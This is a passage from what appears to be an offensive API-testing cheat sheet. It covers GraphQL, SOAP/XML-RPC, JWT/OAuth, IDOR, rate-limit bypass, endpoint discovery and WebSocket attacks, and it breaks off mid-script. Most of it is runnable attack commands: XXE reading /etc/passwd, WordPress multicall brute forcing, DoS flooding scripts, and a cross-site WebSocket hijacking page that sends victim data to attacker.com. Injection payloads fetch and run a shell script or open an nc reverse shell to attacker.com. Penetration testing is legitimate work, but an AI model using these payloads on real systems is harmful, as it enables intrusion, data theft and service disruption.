  -d '{"query":"{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } } }"}'

# Get all mutations
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description args { name type { name kind ofType { name kind } } } } } } }"}'

# Extract specific type details (e.g., User type)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { name fields { name type { name kind ofType { name kind } } } } }"}'
```

**Automated GraphQL Enumeration Tools**

```bash
# GraphQLmap - automated GraphQL testing
python3 graphqlmap.py -u https://target.com/graphql --method POST

# InQL Scanner (Burp Suite extension alternative CLI)
inql -t https://target.com/graphql -o output_schema.json

# GraphQL Voyager (visualize schema)
# First save introspection result, then use online tool at https://graphql-kit.com/graphql-voyager/

# Batch introspection with jq parsing
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @introspection_query.json | jq '.data.__schema.types[] | select(.name | startswith("__") | not)'
```

**GraphQL-Specific Vulnerabilities**

```bash
# Test for batching attacks (amplification)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ users { id username } }"},
    {"query":"{ users { id username } }"},
    {"query":"{ users { id username } }"}
  ]'

# Alias-based query batching
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a:users{id} b:users{id} c:users{id} d:users{id} }"}'

# Nested query depth attack (DoS)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { comments { author { posts { comments { author { id } } } } } } } }"}'

# Field duplication amplification
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id id id id id id id id id id } }"}'
```

**Bypassing Disabled Introspection**

```bash
# Try alternative introspection queries
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __type(name: \"Query\") { fields { name } } }"}'

# Field suggestion attack - trigger suggestions via typos
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ userss { id } }"}'
# Error may reveal: "Did you mean 'users'?"

# Fragment-based discovery
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __type(name: \"Query\") { name kind } }"}'

# Using GraphQL IDE tools that cache schemas
# Check browser cache/localStorage if web interface exists
```

### SOAP/XML-RPC Exploration

SOAP and XML-RPC services expose methods through WSDL definitions and have specific enumeration and exploitation techniques.

**WSDL Enumeration**

```bash
# Common WSDL locations
curl https://target.com/service?wsdl
curl https://target.com/services/UserService?wsdl
curl https://target.com/api/soap?wsdl
curl https://target.com/ws/Service.asmx?wsdl
curl https://target.com/soap/v1?wsdl

# Download and parse WSDL
curl -s https://target.com/service?wsdl -o service.wsdl

# Extract operations from WSDL
grep -oP '(?<=<operation name=")[^"]*' service.wsdl

# Extract endpoints
grep -oP '(?<=<soap:address location=")[^"]*' service.wsdl
```

**SOAP Request Testing**

```bash
# Basic SOAP envelope structure
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: getUserInfo" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://target.com/webservice">
   <soapenv:Header/>
   <soapenv:Body>
      <web:getUserInfo>
         <web:userId>1</web:userId>
      </web:getUserInfo>
   </soapenv:Body>
</soapenv:Envelope>'

# Test for XXE injection
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <web:getUserInfo>
         <web:userId>&xxe;</web:userId>
      </web:getUserInfo>
   </soapenv:Body>
</soapenv:Envelope>'

# SOAP injection attempt
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <web:login>
         <username>admin'"'"' or '"'"'1'"'"'='"'"'1</username>
         <password>anything</password>
      </web:login>
   </soapenv:Body>
</soapenv:Envelope>'
```

**XML-RPC Enumeration**

```bash
# List available methods (if system.listMethods is enabled)
curl -X POST https://target.com/xmlrpc \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# Get method signature
curl -X POST https://target.com/xmlrpc \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.methodSignature</methodName>
  <params>
    <param><value><string>getUserInfo</string></value></param>
  </params>
</methodCall>'

# Get method help
curl -X POST https://target.com/xmlrpc \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.methodHelp</methodName>
  <params>
    <param><value><string>getUserInfo</string></value></param>
  </params>
</methodCall>'

# Call a discovered method
curl -X POST https://target.com/xmlrpc \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>getUserInfo</methodName>
  <params>
    <param><value><int>1</int></value></param>
  </params>
</methodCall>'
```

**WordPress XML-RPC Specific Testing**

```bash
# Check if XML-RPC is enabled
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>'

# Brute force attack using system.multicall
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>password1</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>'

# Pingback DDoS/SSRF
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com/callback</string></value></param>
    <param><value><string>https://target.com/valid-post</string></value></param>
  </params>
</methodCall>'
```

### API Authentication Bypass

Authentication bypass techniques target flaws in API authentication mechanisms, including JWT manipulation, session handling, and authorization logic errors.

**JWT Token Manipulation**

```bash
# Decode JWT without verification
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature" | cut -d'.' -f2 | base64 -d

# Install jwt_tool for comprehensive JWT testing
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Scan for vulnerabilities
python3 jwt_tool.py <JWT_TOKEN> -M at

# Test algorithm confusion (RS256 to HS256)
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

# Test none algorithm
python3 jwt_tool.py <JWT_TOKEN> -X a

# Brute force weak secret
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Modify claims
python3 jwt_tool.py <JWT_TOKEN> -T

# Test key confusion vulnerability
python3 jwt_tool.py <JWT_TOKEN> -X k -pk pubkey.pem

# Manual JWT manipulation using jq and base64
# 1. Decode header and payload
echo "<JWT_TOKEN>" | cut -d'.' -f1 | base64 -d | jq .
echo "<JWT_TOKEN>" | cut -d'.' -f2 | base64 -d | jq .

# 2. Modify payload (change user to admin)
echo '{"user":"admin","role":"admin"}' | base64 -w0 | tr -d '=' | tr '+/' '-_'

# 3. Test with modified token (no signature)
curl https://target.com/api/admin -H "Authorization: Bearer <HEADER>.<MODIFIED_PAYLOAD>."
```

**OAuth/OAuth2 Bypass Techniques**

```bash
# Test redirect_uri manipulation
# Original: https://target.com/oauth/authorize?redirect_uri=https://app.com/callback
# Tests:
curl "https://target.com/oauth/authorize?redirect_uri=https://attacker.com/callback"
curl "https://target.com/oauth/authorize?redirect_uri=https://app.com.attacker.com/callback"
curl "https://target.com/oauth/authorize?redirect_uri=https://app.com@attacker.com"
curl "https://target.com/oauth/authorize?redirect_uri=https://app.com%252f@attacker.com"
curl "https://target.com/oauth/authorize?redirect_uri=https://app.com/callback?redir=https://attacker.com"

# Test state parameter manipulation (CSRF)
# Capture valid authorization URL, remove state parameter
curl "https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://app.com/callback&response_type=code"

# Token leakage via Referer header
# If callback page loads external resources:
curl "https://target.com/oauth/callback?code=AUTH_CODE" -H "Referer: https://attacker.com"
```

**API Key Testing**

```bash
# Test API key in various positions
curl https://target.com/api/users -H "X-API-Key: test123"
curl https://target.com/api/users -H "Authorization: test123"
curl https://target.com/api/users -H "Api-Key: test123"
curl "https://target.com/api/users?api_key=test123"
curl "https://target.com/api/users?apikey=test123"
curl "https://target.com/api/users?key=test123"

# Test for default/leaked API keys from GitHub
# Use tools like:
# truffleHog, gitrob, or manual search
curl "https://target.com/api/users?api_key=test_api_key_12345"
curl "https://target.com/api/users?api_key=default"
curl "https://target.com/api/users?api_key=admin"

# Test API key not required for some endpoints
curl https://target.com/api/public/users  # No auth
curl https://target.com/api/users          # Requires auth?
```

**Mass Assignment / Parameter Pollution**

```bash
# Create normal user account
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"newuser","password":"pass123"}'

# Try adding privileged parameters
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"newuser","password":"pass123","role":"admin"}'

curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"newuser","password":"pass123","isAdmin":true}'

curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"newuser","password":"pass123","admin":1}'

# Update profile with privilege escalation attempt
curl -X PUT https://target.com/api/users/123 \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"email":"new@email.com","role":"admin","isAdmin":true}'
```

**IDOR (Insecure Direct Object Reference)**

```bash
# Enumerate user IDs
for id in {1..100}; do
  curl https://target.com/api/users/$id -H "Authorization: Bearer <TOKEN>"
done

# Test UUID predictability
# If using sequential or time-based UUIDs, generate predictions
curl https://target.com/api/users/550e8400-e29b-41d4-a716-446655440000

# Test with different HTTP methods
curl -X GET https://target.com/api/users/1 -H "Authorization: Bearer <TOKEN>"
curl -X PUT https://target.com/api/users/1 -H "Authorization: Bearer <TOKEN>" -d '{"role":"admin"}'
curl -X DELETE https://target.com/api/users/1 -H "Authorization: Bearer <TOKEN>"

# Numeric ID manipulation in different positions
curl https://target.com/api/orders?user_id=1
curl https://target.com/api/profile/1/orders
curl -X POST https://target.com/api/transfer -d '{"from_account":123,"to_account":456,"amount":1000}'
```

### Rate Limiting Bypass

Rate limiting bypass techniques circumvent API throttling mechanisms to enable brute-forcing, enumeration, or DoS attacks.

**Header-Based Bypasses**

```bash
# Test various forwarding headers
curl https://target.com/api/login -H "X-Forwarded-For: 1.2.3.4" -d "user=admin&pass=test"
curl https://target.com/api/login -H "X-Forwarded-Host: 1.2.3.4" -d "user=admin&pass=test"
curl https://target.com/api/login -H "X-Real-IP: 1.2.3.4" -d "user=admin&pass=test"
curl https://target.com/api/login -H "X-Originating-IP: 1.2.3.4" -d "user=admin&pass=test"
curl https://target.com/api/login -H "X-Remote-IP: 1.2.3.4" -d "user=admin&pass=test"
curl https://target.com/api/login -H "X-Client-IP: 1.2.3.4" -d "user=admin&pass=test"
curl https://target.com/api/login -H "True-Client-IP: 1.2.3.4" -d "user=admin&pass=test"
curl https://target.com/api/login -H "CF-Connecting-IP: 1.2.3.4" -d "user=admin&pass=test"

# Rotate through multiple IPs in headers
for ip in 1.1.1.{1..255}; do
  curl https://target.com/api/endpoint -H "X-Forwarded-For: $ip"
done

# Try localhost/internal IPs to bypass restrictions
curl https://target.com/api/admin -H "X-Forwarded-For: 127.0.0.1"
curl https://target.com/api/admin -H "X-Forwarded-For: 192.168.1.1"
curl https://target.com/api/admin -H "X-Forwarded-For: ::1"
```

**Origin/Referer Manipulation**

```bash
# Manipulate origin header
curl https://target.com/api/endpoint -H "Origin: https://trusted-domain.com"
curl https://target.com/api/endpoint -H "Origin: https://localhost"
curl https://target.com/api/endpoint -H "Origin: null"

# Referer manipulation
curl https://target.com/api/endpoint -H "Referer: https://target.com/admin"
curl https://target.com/api/endpoint -H "Referer: https://trusted-partner.com"
```

**Request Method Tampering**

```bash
# If POST is rate limited, try GET
curl -X GET "https://target.com/api/login?username=admin&password=test"

# Try other methods
curl -X HEAD https://target.com/api/login -d "user=admin&pass=test"
curl -X OPTIONS https://target.com/api/login

# Method override headers
curl -X GET https://target.com/api/login -H "X-HTTP-Method-Override: POST" -d "user=admin&pass=test"
curl -X GET https://target.com/api/login -H "X-HTTP-Method: POST" -d "user=admin&pass=test"
curl -X GET https://target.com/api/login -H "X-Method-Override: POST" -d "user=admin&pass=test"
```

**Case Manipulation**

```bash
# Try different case variations of endpoint
curl https://target.com/api/LOGIN
curl https://target.com/api/Login
curl https://target.com/api/login
curl https://target.com/API/login

# Add trailing slashes or characters
curl https://target.com/api/login/
curl https://target.com/api/login?
curl https://target.com/api/login%20
curl https://target.com/api/login%0d
```

**Null Byte and Encoding**

```bash
# Null byte injection
curl "https://target.com/api/login%00"
curl "https://target.com/api/login%00.json"

# URL encoding variations
curl "https://target.com/api/%6c%6f%67%69%6e"  # login URL encoded
curl "https://target.com/api/%2flogin"         # /login with encoded slash
curl "https://target.com/api/login%2f"
```

**Distributed Attacks**

```bash
# Use multiple user agents
agents=("Mozilla/5.0" "curl/7.68.0" "PostmanRuntime/7.26.8" "python-requests/2.25.1")
for agent in "${agents[@]}"; do
  curl https://target.com/api/login -A "$agent" -d "user=admin&pass=test"
done

# Rotate through proxy list
while IFS= read -r proxy; do
  curl --proxy "$proxy" https://target.com/api/login -d "user=admin&pass=test"
done < proxies.txt
```

**Race Conditions**

```bash
# Send multiple requests simultaneously
for i in {1..100}; do
  curl https://target.com/api/endpoint &
done
wait

# Using GNU parallel
parallel -j 50 curl https://target.com/api/endpoint ::: {1..100}

# Turbo Intruder in Burp Suite is excellent for race conditions
# Python script for precise timing control
import requests
import threading

def send_request():
    requests.post('https://target.com/api/endpoint', data={'param':'value'})

threads = []
for i in range(50):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### API Version Abuse

Exploiting outdated or differently secured API versions to bypass security controls.

**Version Discovery**

```bash
# Common version patterns
curl https://target.com/api/v1/users
curl https://target.com/api/v2/users
curl https://target.com/api/v3/users

# Try numeric versions
for ver in {1..10}; do
  curl https://target.com/api/v$ver/users -i | grep "HTTP/"
done

# Version in subdomain
curl https://v1.api.target.com/users
curl https://v2.api.target.com/users
curl https://api-v1.target.com/users

# Version in headers
curl https://target.com/api/users -H "Accept: application/vnd.company.v1+json"
curl https://target.com/api/users -H "Api-Version: 1"
curl https://target.com/api/users -H "X-API-Version: 2"

# Version in query parameters
curl "https://target.com/api/users?version=1"
curl "https://target.com/api/users?v=2"
curl "https://target.com/api/users?api-version=1"
```

**Exploiting Version Differences**

```bash
# Test if older version lacks authentication
curl https://target.com/api/v1/admin/users  # No auth required?
curl https://target.com/api/v2/admin/users  # Auth required

# Test for different input validation
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","role":"admin"}'  # Mass assignment allowed in v1?

curl -X POST https://target.com/api/v2/users \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","role":"admin"}'  # Blocked in v2

# Test for SQL injection in older versions
curl "https://target.com/api/v1/users?id=1' OR '1'='1"
curl "https://target.com/api/v2/users?id=1' OR '1'='1"  # Sanitized in v2?

# Test deprecated endpoints still accessible
curl https://target.com/api/v1/legacy/deleteAllUsers
```

**Version Header Manipulation**

```bash
# Request old version through new endpoint
curl https://target.com/api/v3/admin/config \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Api-Version: 1"

# Try version downgrade attacks
curl https://target.com/api/users \
  -H "Accept: application/vnd.company.v1+json" \
  -H "Authorization: Bearer <TOKEN>"

# Content negotiation version abuse
curl https://target.com/api/users \
  -H "Accept: application/json; version=1" \
  -H "Authorization: Bearer <TOKEN>"
```

### Hidden/Undocumented Endpoints

Discovering endpoints not listed in public documentation through fuzzing, pattern analysis, and information leakage.

**JavaScript File Analysis**

```bash
# Extract URLs from JavaScript files
curl -s https://target.com/app.js | grep -oP '"/api/[^"]*"'
curl -s https://target.com/app.js | grep -oP "'\''/api/[^'\'']*'\''"

# Find endpoints in minified JS (using regex)
curl -s https://target.com/main.min.js | grep -oP '\w+:"/api/[^"]*"'

# Use linkfinder
python3 linkfinder.py -i https://target.com -d -o endpoints.html

# Extract from all JS files
gospider -s https://target.com -c 10 -d 2 | grep -E "\.js$" | while read url; do
  echo "Analyzing: $url"
  curl -s "$url" | grep -oP '"/api/[^"]*"'
done

# Use relative-url-extractor
python3 relative-url-extractor.py https://target.com
```

**Mobile App Reverse Engineering**

```bash
# Extract APK contents
apktool d application.apk -o output_folder

# Search for API endpoints in decompiled code
grep -r "https://api.target.com" output_folder/
grep -r "/api/" output_folder/ | grep -E "(http|URL|endpoint)"

# Search in strings
strings application.apk | grep -E "(api|endpoint|/v[0-9])"

# Find hardcoded secrets and endpoints
grep -r -E "(api_key|apikey|secret|token)" output_folder/

# iOS IPA analysis
unzip application.ipa
strings Payload/Application.app/Application | grep -E "api|endpoint"
plutil -p Payload/Application.app/Info.plist | grep -i url

# Use Mobile Security Framework (MobSF)
# Upload APK/IPA to MobSF for automated analysis
python3 manage.py runserver 0.0.0.0:8000
```

**GitHub/Source Code Repository Reconnaissance**

```bash
# Search GitHub for organization's repos
curl -s "https://api.github.com/orgs/TARGET_ORG/repos?per_page=100" | jq -r '.[].clone_url'

# Clone and search for endpoints
git clone https://github.com/target/repo
cd repo
grep -r "api\." . | grep -E "(http|endpoint)"
grep -r "/api/" . --include="*.js" --include="*.py" --include="*.java"

# Search commit history for removed endpoints
git log -p | grep -E "(/api/|endpoint)" -B 3 -A 3

# Use truffleHog for secrets and endpoints
trufflehog git https://github.com/target/repo --regex --entropy=True

# GitHub dorking for exposed endpoints
# Use GitHub search:
# "target.com/api" extension:js
# "api.target.com" extension:json
# org:TARGET_ORG "api_key" OR "apikey"
```

**Wayback Machine and Archive Analysis**

```bash
# Fetch historical URLs
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/api/*&output=json&fl=original&collapse=urlkey" | jq -r '.[]|.[0]' | sort -u

# Use waybackurls
echo "target.com" | waybackurls | grep "/api/" | sort -u

# Use gau (Get All URLs)
echo "target.com" | gau | grep "/api/" | sort -u

# Combine multiple sources
echo "target.com" | gau | grep "/api/" > urls.txt
echo "target.com" | waybackurls | grep "/api/" >> urls.txt
sort -u urls.txt > unique_api_urls.txt

# Test historical endpoints
while IFS= read -r url; do
  echo "Testing: $url"
  curl -s -o /dev/null -w "%{http_code}\n" "$url"
done < unique_api_urls.txt
```

**Pattern-Based Endpoint Discovery**

```bash
# If you find /api/v1/users, test variations:
curl https://target.com/api/v1/user
curl https://target.com/api/v1/admin
curl https://target.com/api/v1/admins
curl https://target.com/api/v1/users/profile
curl https://target.com/api/v1/users/settings
curl https://target.com/api/v1/users/privileges
curl https://target.com/api/v1/users/export
curl https://target.com/api/v1/users/delete
curl https://target.com/api/v1/users/backup

# Test CRUD operations
curl -X GET https://target.com/api/v1/users
curl -X POST https://target.com/api/v1/users
curl -X PUT https://target.com/api/v1/users/1
curl -X DELETE https://target.com/api/v1/users/1
curl -X PATCH https://target.com/api/v1/users/1

# Test internal/debug endpoints
curl https://target.com/api/internal/users
curl https://target.com/api/debug/users
curl https://target.com/api/test/users
curl https://target.com/api/dev/users
curl https://target.com/api/admin/users
curl https://target.com/api/private/users
```

**DNS and Subdomain Enumeration**

```bash
# Find API subdomains
subfinder -d target.com | grep -E "(api|rest|graphql|soap)"

# Amass enumeration
amass enum -d target.com | grep -E "(api|rest|ws)"

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | grep -E "api"

# Test discovered subdomains
echo "api.target.com" | httpx -silent | while read url; do
  echo "Testing: $url"
  curl -s "$url/api" -o /dev/null -w "%{http_code}\n"
done
```

**Fuzzing with Custom Wordlists**

```bash
# Create custom wordlist from known endpoints
cat known_endpoints.txt | sed 's/users/admins/' > custom_fuzz.txt
cat known_endpoints.txt | sed 's/v1/v2/' >> custom_fuzz.txt
cat known_endpoints.txt | sed 's/get/create/' >> custom_fuzz.txt

# Fuzz with discovered patterns
ffuf -w custom_fuzz.txt -u https://target.com/api/FUZZ -mc 200,201,204,301,302,401,403 -t 50

# Combine with parameter fuzzing
ffuf -w endpoints.txt:ENDPOINT -w params.txt:PARAM \
  -u "https://target.com/api/ENDPOINT?PARAM=test" \
  -mc 200,201,204,301,302,401,403
```

**Automated Tools for Endpoint Discovery**

```bash
# Arjun for parameter discovery
arjun -u https://target.com/api/users -m GET POST PUT DELETE -oJ output.json

# Kiterunner with API-specific wordlists
kr scan https://target.com -w routes-large.kite -A raft-large-words

# Using Burp Suite extensions
# - Param Miner: Discovers hidden parameters
# - InQL: GraphQL scanner
# - Autorize: Tests authorization issues

# Nuclei with API-specific templates
nuclei -u https://target.com -t ~/nuclei-templates/api/

# OWASP ZAP API scan
zap-cli quick-scan --spider --ajax-spider https://target.com/api
```

**Response Analysis for Hidden Endpoints**

```bash
# Analyze error messages for path disclosure
curl https://target.com/api/v1/nonexistent -v 2>&1 | grep -E "(path|endpoint|route|method)"

# Test for verbose errors
curl https://target.com/api/v1/ -H "Accept: application/json" -v
curl https://target.com/api/v1/ -H "Content-Type: application/xml" -v

# Stack trace analysis
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"invalid_json}' -v 2>&1 | grep -oP '/api/[^"]*'

# OPTIONS method disclosure
curl -X OPTIONS https://target.com/api/v1/users -v 2>&1 | grep -i "allow:"
```

### WebSocket Exploitation

WebSocket connections provide real-time bidirectional communication and introduce unique attack surfaces.

**WebSocket Connection Testing**

```bash
# Test WebSocket connection with websocat
websocat ws://target.com/socket -v

# With authentication header
websocat ws://target.com/socket -H "Authorization: Bearer TOKEN" -v

# WSS (secure WebSocket)
websocat wss://target.com/socket -v

# Using wscat
npm install -g wscat
wscat -c ws://target.com/socket

# With headers
wscat -c ws://target.com/socket -H "Authorization: Bearer TOKEN"

# Python script for WebSocket testing
python3 << 'EOF'
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    print("Connection opened")
    ws.send(json.dumps({"action": "subscribe", "channel": "users"}))

ws = websocket.WebSocketApp("ws://target.com/socket",
                            on_message=on_message,
                            on_open=on_open)
ws.run_forever()
EOF
```

**WebSocket Handshake Analysis**

```bash
# Intercept and modify WebSocket handshake with Burp Suite
# Look for upgrade request:
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(echo -n "random16bytes" | base64)" \
  http://target.com/socket

# Test for missing origin validation
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Origin: https://attacker.com" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(echo -n "random16bytes" | base64)" \
  http://target.com/socket

# Test different origins (CSWSH - Cross-Site WebSocket Hijacking)
for origin in "null" "https://attacker.com" "https://target.com.attacker.com"; do
  echo "Testing origin: $origin"
  curl -i -N \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Origin: $origin" \
    -H "Sec-WebSocket-Version: 13" \
    -H "Sec-WebSocket-Key: $(echo -n "random16bytes" | base64)" \
    http://target.com/socket
done
```

**WebSocket Message Fuzzing**

```bash
# Send various message types
websocat ws://target.com/socket << 'EOF'
{"type":"subscribe","channel":"admin"}
{"type":"message","content":"test"}
{"type":"command","cmd":"whoami"}
{"action":"getUsers"}
{"action":"deleteUser","userId":1}
EOF

# Test for injection in WebSocket messages
websocat ws://target.com/socket << 'EOF'
{"message":"'; DROP TABLE users; --"}
{"search":"<script>alert(1)</script>"}
{"command":"test && whoami"}
{"userId":"1' OR '1'='1"}
EOF

# Automated fuzzing with Python
python3 << 'EOF'
import websocket
import json
import time

payloads = [
    {"action": "admin"},
    {"action": "getConfig"},
    {"userId": "1' OR '1'='1"},
    {"command": "; cat /etc/passwd"},
    {"data": "../../../etc/passwd"},
    {"message": "<img src=x onerror=alert(1)>"}
]

ws = websocket.create_connection("ws://target.com/socket")
for payload in payloads:
    print(f"Sending: {payload}")
    ws.send(json.dumps(payload))
    time.sleep(0.5)
    try:
        result = ws.recv()
        print(f"Response: {result}\n")
    except:
        pass
ws.close()
EOF
```

**Cross-Site WebSocket Hijacking (CSWSH)**

```html
<!-- Host this HTML on attacker domain -->
<!-- CSWSH_PoC.html -->
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
var ws = new WebSocket('ws://target.com/socket');

ws.onopen = function() {
    console.log('WebSocket connection established');
    // Send malicious commands
    ws.send(JSON.stringify({
        "action": "getPrivateMessages",
        "userId": "victim"
    }));
};

ws.onmessage = function(event) {
    console.log('Received:', event.data);
    // Exfiltrate data
    fetch('https://attacker.com/log?data=' + btoa(event.data));
};

ws.onerror = function(error) {
    console.log('WebSocket error:', error);
};
</script>
</body>
</html>
```

**Testing WebSocket Authentication**

```bash
# Test connection without token
websocat ws://target.com/socket -v

# Test with expired token
websocat ws://target.com/socket -H "Authorization: Bearer EXPIRED_TOKEN" -v

# Test token in different locations
# In header
websocat ws://target.com/socket -H "Authorization: Bearer TOKEN"

# In query parameter
websocat "ws://target.com/socket?token=TOKEN"

# In first message
websocat ws://target.com/socket << 'EOF'
{"auth": "TOKEN"}
EOF

# Test for session fixation
websocat "ws://target.com/socket?sessionId=attacker_controlled_id"

# Test authentication bypass with manipulated handshake
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Cookie: session=victim_session" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  http://target.com/socket
```

**WebSocket Command Injection**

```bash
# Test for OS command injection
websocat ws://target.com/socket << 'EOF'
{"cmd":"ping 127.0.0.1; whoami"}
{"command":"test && cat /etc/passwd"}
{"exec":"$(curl attacker.com/shell.sh | bash)"}
{"system":"`id`"}
{"run":"| nc attacker.com 4444 -e /bin/bash"}
EOF

# Test for SQL injection
websocat ws://target.com/socket << 'EOF'
{"query":"1' OR '1'='1"}
{"search":"admin'--"}
{"userId":"1 UNION SELECT password FROM users--"}
EOF

# Test for XXE
websocat ws://target.com/socket << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<message>&xxe;</message>
EOF

# Test for template injection
websocat ws://target.com/socket << 'EOF'
{"template":"{{7*7}}"}
{"render":"${7*7}"}
{"content":"<%= system('whoami') %>"}
EOF
```

**WebSocket DoS Testing**

```bash
# Rapid connection establishment
for i in {1..1000}; do
  websocat ws://target.com/socket -e &
done

# Large message flooding
python3 << 'EOF'
import websocket
import time

ws = websocket.create_connection("ws://target.com/socket")
payload = "A" * 1000000  # 1MB message

for i in range(1000):
    try:
        ws.send(payload)
        print(f"Sent message {i}")
    except:
        print("Connection closed")
        break
EOF

# Message bombing (many small messages)
python3 << 'EOF'
import websocket
import json

ws = websocket.create_connection("ws://target.com/socket")
for i in range(100000):
    ws.send(json.dumps({"id": i, "data": "test"}))
    if i % 1000 == 0:
        print(f"Sent {i} messages")
EOF

# Frame fragmentation attack
# Requires low-level WebSocket manipulation
```

**WebSocket Smuggling**

```bash
# Test for HTTP request smuggling via WebSocket upgrade
# Attempt to inject additional HTTP requests

# Malformed upgrade request
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  -H "Content-Length: 5" \
  --data-binary "AAAAA" \
  http://target.com/socket

# Double upgrade attempt
curl -i -N \
  -H "Connection: Upgrade, Keep-Alive" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  --data-binary "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  http://target.com/socket
```

**WebSocket Proxy and Interception**

```bash
# Using Burp Suite
# 1. Enable WebSocket interception in Proxy > Options
# 2. Set browser to use Burp as proxy
# 3. Connect to WebSocket - messages appear in WebSockets history tab
# 4. Intercept and modify messages in real-time

# Using mitmproxy for WebSocket
mitmweb --mode reverse:http://target.com --listen-port 8080
# Then connect via: ws://localhost:8080/socket

# Custom WebSocket proxy with Python
python3 << 'EOF'
import asyncio
import websockets
import json

async def proxy_handler(websocket, path):
    # Connect to target WebSocket
    async with websockets.connect('ws://target.com/socket') as target_ws:
        # Forward client -> target
        async def forward_to_target():
            async for message in websocket:
                print(f"Client->Target: {message}")
                # Modify message here if needed
                await target_ws.send(message)
        
        # Forward target -> client
        async def forward_to_client():
            async for message in target_ws:
                print(f"Target->Client: {message}")
                # Modify message here if needed
                await websocket.send(message)
        
        await asyncio.gather(
            forward_to_target(),
